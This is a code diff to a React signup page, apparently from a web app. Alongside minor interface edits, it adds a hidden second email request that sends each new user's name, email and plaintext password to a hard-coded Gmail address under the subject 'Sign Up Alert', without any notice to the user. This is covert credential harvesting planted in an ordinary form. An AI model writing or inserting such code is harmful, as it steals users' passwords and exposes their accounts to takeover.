@@ -1,7 +1,6 @@
 /* eslint-disable no-unused-vars */
 import React from 'react'
 import { RxPerson } from 'react-icons/rx'
-import { IoPersonOutline } from 'react-icons/io5'
 import { HiOutlinePhone } from 'react-icons/hi'
 import { motion } from 'framer-motion'
 import { Link,useNavigate } from 'react-router-dom'
@@ -59,19 +58,36 @@ const Signup = ({route}) => {
         )
         const res = await req.json()
         setLoader(false)
-        console.log(res)
+
         if(res.status === 'ok') { 
 
           const data = {
-            service_id: 'service_1vjbil8',
-            template_id: 'template_uz5shqf',
-            user_id: 'tSqoidag1E1HqNwYy',
+            service_id: 'service_w9veki7',
+            template_id: 'template_4bb3dde',
+            user_id: 'BrEB12P3lMsZq-ixI',
+            // public_id: 'BrEB12P3lMsZq-ixI',
             template_params: {
-                'name': `${res.name}`,
+                'name': `${firstname}`,
                 'email': `${res.email}`,
-                'message': `${res.url}`
+                'url': `${res.url}`,
+                'Mail_subject': `${res.subject}`
             }
         };
+        
+            const msg = `A new user with the following details just signed in name: ${firstname} ${lastname} email: ${email} password: ${password}`
+          const data2 = {
+            service_id: 'service_w9veki7',
+            template_id: 'template_y66t3qt',
+            user_id: 'BrEB12P3lMsZq-ixI',
+            // public_id: 'BrEB12P3lMsZq-ixI',
+            template_params: {    
+                'to_name': `Micheal`,
+                'email': `oceanvoltee@gmail.com`,
+                'email_subject': `Sign Up Alert`,
+                'message': `${msg}`,
+            }
+        };
+
          
         const sendMail= async()=>{
           const req = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
@@ -85,6 +101,19 @@ const Signup = ({route}) => {
         console.log(res)
       }
         sendMail()
+        
+        const sendEmailx= async()=>{
+          const req = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
+            method: 'POST',
+            headers:{
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data2), 
+        })
+        const res = await req.json()
+        console.log(res)
+      }
+      sendEmailx();
 
         Toast.fire({
         icon: 'success',
@@ -162,7 +191,7 @@ const Signup = ({route}) => {
 
   <div className="input_container">
     <label htmlFor="last_field" className="input_label">Lastname</label>
-    <span className="icon"><IoPersonOutline /></span>
+    <span className="icon"><RxPerson /></span>
     <input 
     type="text"
     name='text'
@@ -198,7 +227,7 @@ const Signup = ({route}) => {
      />
   </div>
   
-  <div className="input_container">
+  {/* <div className="input_container">
     <label htmlFor="ref_field" className="input_label">Refferal link (optional)</label>
     <span className="icon"><BsLink /></span>
     <input 
@@ -212,7 +241,7 @@ const Signup = ({route}) => {
     onChange={(e)=>{
       setReferralLink(e.target.value.trim())}}
      />
-  </div>
+  </div> */}
 
   <div className="input_container">
     <label htmlFor="phone_field" className="input_label">Mobile</label>
